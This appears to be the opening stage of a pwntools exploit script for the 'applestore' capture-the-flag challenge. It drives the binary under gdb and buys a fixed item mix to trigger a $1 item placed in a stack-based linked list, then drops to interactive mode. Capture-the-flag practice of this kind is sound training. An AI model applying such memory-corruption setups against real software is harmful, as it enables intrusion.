#!/usr/bin/env python3

from pwn import *

libc = ELF("libc.so.6")
ld = ELF("./ld-2.23.so")

p = gdb.debug('./applestore_patched', gdbscript='''
b main
b checkout
continue
''')
#p = process('./applestore_patched')

def add_item(item):
	p.sendlineafter(b'> ', b'2')
	p.sendlineafter(b'Device Number> ', item)

# add 6 x iphone 6 - 199
for i in range (6):
	add_item(b'1')

# add 20 x iphone 6 plus - 299
for i in range(20):
	add_item(b'2')

# checkout (this adds our $1 iphone to myCart linked list on the stack) 
p.sendlineafter(b'> ', b'5')
p.sendlineafter(b'Let me check your cart. ok? (y/n) > ', b'y')

p.interactive()
